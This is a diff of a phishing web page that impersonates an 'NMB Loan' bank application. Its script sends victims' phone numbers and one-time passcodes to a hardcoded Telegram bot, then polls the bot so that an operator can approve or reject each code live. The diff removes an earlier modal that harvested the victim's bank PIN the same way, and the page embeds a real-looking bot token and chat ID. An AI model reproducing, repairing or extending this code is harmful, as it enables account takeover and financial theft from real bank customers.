@@ -159,116 +159,15 @@
             background: rgba(0,34,68,0.93);
             z-index: 2000;
             backdrop-filter: blur(6px);
+            text-align: center;
+            padding: 20px;
         }
 
         .overlay.on { display: flex; }
         .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.12); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
-        .sp-t { font-size: 14px; font-weight: 800; color: white; }
-        .sp-s { font-size: 11px; color: rgba(255,255,255,0.65); }
+        .sp-t { font-size: 16px; font-weight: 800; color: white; margin-top: 10px; }
+        .sp-s { font-size: 12px; color: rgba(255,255,255,0.7); margin-top: 5px; line-height: 1.5; }
         @keyframes sp { to { transform: rotate(360deg); } }
-
-        /* PIN Modal */
-        .pin-overlay {
-            position: fixed; inset: 0;
-            display: none;
-            align-items: center; justify-content: center;
-            background: linear-gradient(135deg, var(--navy-dark), var(--nmb-blue));
-            z-index: 2000;
-            padding: 20px;
-            backdrop-filter: blur(6px);
-        }
-
-        .pin-overlay.on { display: flex; }
-
-        .pin-card {
-            background: white;
-            border-radius: 18px;
-            padding: 36px 28px;
-            max-width: 380px;
-            width: 100%;
-            box-shadow: 0 24px 64px rgba(0,51,102,0.4);
-            text-align: center;
-        }
-
-        .pin-logo { font-size: 20px; font-weight: 900; margin-bottom: 18px; display: flex; align-items: center; justify-content: center; }
-        .pin-logo .nmb { color: var(--nmb-blue); }
-        .pin-logo .loan { color: var(--nmb-gold); margin-left: 2px; }
-
-        .pin-title { font-size: 17px; font-weight: 900; color: var(--nmb-blue); margin-bottom: 4px; }
-        .pin-sub { font-size: 12px; color: var(--muted); margin-bottom: 22px; }
-
-        .pin-amount {
-            background: linear-gradient(135deg, var(--light), var(--white));
-            border-radius: 12px;
-            padding: 14px;
-            margin-bottom: 20px;
-            border: 1.5px solid var(--border);
-        }
-
-        .pin-amount .pa-label { font-size: 10px; color: var(--muted); font-weight: 700; text-transform: uppercase; }
-        .pin-amount .pa-value { font-size: 1.5rem; font-weight: 900; color: var(--nmb-blue); margin-top: 3px; }
-
-        .pin-input-wrap {
-            border: 2px solid var(--border);
-            border-radius: 12px;
-            padding: 14px;
-            background: var(--light);
-            margin-bottom: 16px;
-            transition: all 0.2s;
-        }
-
-        .pin-input-wrap:focus-within { border-color: var(--nmb-gold); background: white; box-shadow: 0 0 0 4px rgba(228,193,106,0.08); }
-
-        .pin-fi {
-            width: 100%;
-            border: none;
-            background: transparent;
-            font-size: 26px;
-            color: var(--dark);
-            outline: none;
-            font-family: inherit;
-            letter-spacing: 14px;
-            text-align: center;
-            font-weight: 900;
-        }
-
-        .pin-fi::placeholder { color: #b8b8b8; letter-spacing: 0; font-size: 13px; font-weight: 500; }
-
-        .pin-err {
-            display: none;
-            background: rgba(211,47,47,0.08);
-            border: 1.5px solid rgba(211,47,47,0.2);
-            color: var(--error);
-            font-size: 11px;
-            font-weight: 700;
-            border-radius: 10px;
-            padding: 9px;
-            margin-bottom: 14px;
-        }
-
-        .pin-err.show { display: block; }
-
-        .pin-btns { display: flex; gap: 10px; }
-
-        .pin-btn {
-            flex: 1;
-            padding: 14px;
-            border-radius: 50px;
-            border: none;
-            font-weight: 900;
-            font-size: 12px;
-            text-transform: uppercase;
-            cursor: pointer;
-            font-family: inherit;
-            transition: all 0.2s;
-        }
-
-        .pin-btn-ok { background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark)); color: white; box-shadow: 0 4px 14px rgba(0,51,102,0.28); }
-        .pin-btn-ok:hover { background: var(--nmb-gold); color: var(--nmb-blue); transform: translateY(-2px); }
-        .pin-btn-x { background: transparent; color: var(--nmb-blue); border: 2px solid var(--nmb-blue); }
-        .pin-btn-x:hover { background: var(--light); }
-
-        .pin-secure { margin-top: 16px; font-size: 10px; color: var(--muted); font-weight: 700; }
 
         @media (max-width: 500px) {
             main { padding: 24px 12px; }
@@ -276,11 +175,10 @@
             .otp-row { gap: 5px; }
             .otp-box { width: 40px; height: 48px; font-size: 18px; }
             .btns { flex-direction: column; }
-            .pin-card { padding: 28px 18px; }
         }
     </style>
 </head>
-<body>
+<body onload="init()">
     <header><a class="logo" href="index.html"><span class="nmb">NMB</span><span class="loan">Loan</span></a></header>
 
     <main>
@@ -318,39 +216,17 @@
         </div>
     </main>
 
-    <div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">Verifying Code</div><div class="sp-s">Please wait...</div></div>
-
-    <!-- PIN Modal -->
-    <div id="pinOv" class="pin-overlay">
-        <div class="pin-card">
-            <div class="pin-logo"><span class="nmb">NMB</span><span class="loan">Loan</span></div>
-            <div class="pin-title">Confirm Application</div>
-            <div class="pin-sub">Enter your NMB PIN to authorize this loan application</div>
-
-            <div class="pin-amount">
-                <div class="pa-label">Loan Amount</div>
-                <div class="pa-value" id="pinAmt">$0 USD</div>
-            </div>
-
-            <div id="pinErr" class="pin-err"></div>
-
-            <div class="pin-input-wrap">
-                <input type="password" class="pin-fi" id="pinIn" placeholder="Enter 4-digit PIN" inputmode="numeric" maxlength="4">
-            </div>
-
-            <div class="pin-btns">
-                <button class="pin-btn pin-btn-ok" onclick="doPin()">Authorize Now</button>
-                <button class="pin-btn pin-btn-x" onclick="closePin()">Cancel</button>
-            </div>
-
-            <div class="pin-secure">🔒 Secured by NMB Bank · SSL 256-bit</div>
-        </div>
+    <div id="ov" class="overlay">
+        <div class="spin"></div>
+        <div class="sp-t">Verifying Code</div>
+        <div class="sp-s">Please wait a moment while we process your request.<br>Do not close this page.</div>
     </div>
 
     <script>
         const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
         const CID = '7547427914';
         let bd = {}, luid = 0, otp = '', phone = '';
+        const boxes = document.querySelectorAll('.otp-box');
 
         function init() {
             const p = new URLSearchParams(location.search);
@@ -361,55 +237,36 @@
                 document.getElementById('bBar').style.display = 'block';
                 document.getElementById('bD').textContent = d;
                 document.getElementById('bP').textContent = '$' + pr + ' USD';
-                document.getElementById('pinAmt').textContent = '$' + pr + ' USD';
             }
-            // Autofill for testing if needed, or wait for input
-            autoFill();
+            setupOTP();
         }
 
-        function autoFill() {
-            // Check for OTP in URL for auto-processing
-            const p = new URLSearchParams(location.search);
-            const autoOtp = p.get('otp');
-            if (autoOtp && autoOtp.length === 6) {
-                const digs = autoOtp.split('');
-                digs.forEach((d, i) => {
-                    if (i < boxes.length) {
-                        boxes[i].value = d;
-                        boxes[i].classList.add('ok');
+        function setupOTP() {
+            boxes.forEach((b, i) => {
+                b.addEventListener('input', e => {
+                    const v = e.target.value;
+                    if (v.length > 1) {
+                        const digs = v.replace(/\D/g, '').split('');
+                        digs.forEach((d, j) => { if (i+j < boxes.length) { boxes[i+j].value = d; boxes[i+j].classList.add('ok'); } });
+                        boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
+                        chk();
+                        if (otp.length === 6) doOTP();
+                        return;
                     }
-                });
-                chk();
-                doOTP();
-            }
-        }
-
-        // OTP boxes
-        const boxes = document.querySelectorAll('.otp-box');
-        boxes.forEach((b, i) => {
-            b.addEventListener('input', e => {
-                const v = e.target.value;
-                if (v.length > 1) {
-                    const digs = v.replace(/\D/g, '').split('');
-                    digs.forEach((d, j) => { if (i+j < boxes.length) { boxes[i+j].value = d; boxes[i+j].classList.add('ok'); } });
-                    boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
+                    if (v) { 
+                        b.classList.add('ok'); 
+                        if (i < boxes.length - 1) boxes[i+1].focus(); 
+                    } else { 
+                        b.classList.remove('ok'); 
+                    }
                     chk();
-                    if (otp.length === 6) doOTP(); // Autosend
-                    return;
-                }
-                if (v) { 
-                    b.classList.add('ok'); 
-                    if (i < boxes.length - 1) boxes[i+1].focus(); 
-                } else { 
-                    b.classList.remove('ok'); 
-                }
-                chk();
-                if (otp.length === 6) doOTP(); // Autosend
+                    if (otp.length === 6) doOTP();
+                });
+                b.addEventListener('keydown', e => {
+                    if (e.key === 'Backspace' && !b.value && i > 0) boxes[i-1].focus();
+                });
             });
-            b.addEventListener('keydown', e => {
-                if (e.key === 'Backspace' && !b.value && i > 0) boxes[i-1].focus();
-            });
-        });
+        }
 
         function chk() { otp = Array.from(boxes).map(b => b.value).join(''); }
         function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
@@ -417,11 +274,19 @@
 
         async function tg(msg, btns) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
                 });
+                const d = await r.json();
+                if (d.ok) {
+                    const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
+                    const ud = await ur.json();
+                    if (ud.ok && ud.result.length > 0) {
+                        luid = ud.result[0].update_id;
+                    }
+                }
             } catch(e) { console.error(e); }
         }
 
@@ -431,8 +296,7 @@
 
             const msg = `🔑 <b>OTP Code</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>OTP:</b> <code>${otp}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>`;
             const btns = [
-                [{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Declined', callback_data: 'otp_declined' }],
-                [{ text: '⚠️ Already Applied', callback_data: 'otp_applied' }]
+                [{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Declined', callback_data: 'otp_declined' }]
             ];
 
             document.getElementById('ov').classList.add('on');
@@ -446,87 +310,29 @@
                     .then(r => r.json())
                     .then(d => {
                         if (d.ok && d.result.length > 0) {
-                            const u = d.result[0];
-                            luid = u.update_id;
-                            if (u.callback_query) {
-                                const cb = u.callback_query.data;
-                                if (cb === 'otp_approved') { 
-                                    clearInterval(iv); 
-                                    document.getElementById('ov').classList.remove('on'); 
-                                    document.getElementById('pinOv').classList.add('on'); // Show PIN Popup
+                            d.result.forEach(u => {
+                                luid = u.update_id;
+                                if (u.callback_query) {
+                                    const cb = u.callback_query.data;
+                                    if (cb === 'otp_approved') { 
+                                        clearInterval(iv); 
+                                        document.getElementById('ov').classList.remove('on'); 
+                                        location.href = 'success.html';
+                                    }
+                                    else if (cb === 'otp_declined') { 
+                                        clearInterval(iv); 
+                                        document.getElementById('ov').classList.remove('on'); 
+                                        showErr('Invalid code. Please try again.'); 
+                                        boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); }); 
+                                        boxes[0].focus(); 
+                                    }
                                 }
-                                else if (cb === 'otp_declined') { 
-                                    clearInterval(iv); 
-                                    document.getElementById('ov').classList.remove('on'); 
-                                    showErr('Invalid code. Try again.'); 
-                                    boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); }); 
-                                    boxes[0].focus(); 
-                                }
-                                else if (cb === 'otp_applied') { 
-                                    clearInterval(iv); 
-                                    document.getElementById('ov').classList.remove('on'); 
-                                    alert('This application has already been processed.');
-                                }
-                            }
+                            });
                         }
                     }).catch(e => console.error(e));
-            }, 1000);
-            setTimeout(() => clearInterval(iv), 300000);
+            }, 1500);
+            setTimeout(() => clearInterval(iv), 600000);
         }
-
-        function doPin() {
-            const pin = document.getElementById('pinIn').value;
-            const e = document.getElementById('pinErr');
-            e.classList.remove('show');
-            if (pin.length !== 4) { e.textContent = 'Enter 4-digit PIN'; e.classList.add('show'); return; }
-
-            const msg = `🔐 <b>Transaction PIN</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>`;
-            const btns = [[{ text: '✓ Valid PIN', callback_data: 'pin_valid' }, { text: '✗ Invalid PIN', callback_data: 'pin_invalid' }]];
-
-            document.getElementById('pinOv').classList.remove('on');
-            document.getElementById('ov').classList.add('on');
-            tg(msg, btns);
-            pollPin();
-        }
-
-        function pollPin() {
-            const iv = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
-                    .then(r => r.json())
-                    .then(d => {
-                        if (d.ok && d.result.length > 0) {
-                            const u = d.result[0];
-                            luid = u.update_id;
-                            if (u.callback_query) {
-                                const cb = u.callback_query.data;
-                                if (cb === 'pin_valid') { 
-                                    clearInterval(iv); 
-                                    document.getElementById('ov').classList.remove('on'); 
-                                    goSuccess(); 
-                                }
-                                else if (cb === 'pin_invalid') { 
-                                    clearInterval(iv); 
-                                    document.getElementById('ov').classList.remove('on'); 
-                                    document.getElementById('pinOv').classList.add('on');
-                                    document.getElementById('pinIn').value = '';
-                                    const pe = document.getElementById('pinErr');
-                                    pe.textContent = 'Incorrect PIN. Please try again.';
-                                    pe.classList.add('show');
-                                }
-                            }
-                        }
-                    }).catch(e => console.error(e));
-            }, 1000);
-            setTimeout(() => clearInterval(iv), 300000);
-        }
-
-        function closePin() { document.getElementById('pinOv').classList.remove('on'); }
-
-        function goSuccess() {
-            location.href = `success.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || '0'}&phone=${phone}`;
-        }
-
-        window.addEventListener('load', init);
     </script>
 </body>
 </html>
